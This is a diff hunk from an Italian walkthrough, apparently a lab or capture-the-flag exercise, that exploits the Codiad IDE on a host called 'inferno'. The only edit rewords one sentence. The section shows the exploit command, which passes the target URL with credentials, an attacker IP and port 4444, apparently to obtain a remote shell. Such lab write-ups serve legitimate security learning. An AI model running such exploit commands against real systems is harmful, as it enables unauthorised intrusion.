@@ -50,7 +50,7 @@ Dopo aver scoperto che il sistema utilizza Codiad, un ambiente di sviluppo integ
 
 # EXPLOITATION
 
-Successivamente, ho proceduto con l'esecuzione dei comandi necessari per eseguire un attacco di remote code execution. Ho eseguito tre terminali. Nel primo terminale ho eseguito:
+Successivamente, ho proceduto con l'esecuzione dei comandi necessari al fine di avere remote code execution. Ho eseguito tre terminali. Nel primo terminale ho eseguito:
 
 - `python2 exploit.py http://admin:dante1@10.0.2.11/inferno/ admin dante1 10.0.2.4 4444 linux`: esegue lo script Python exploit.py, passando parametri essenziali come l'URL, le credenziali, l'indirizzo IP, la porta e il sistema operativo di destinazione.
 
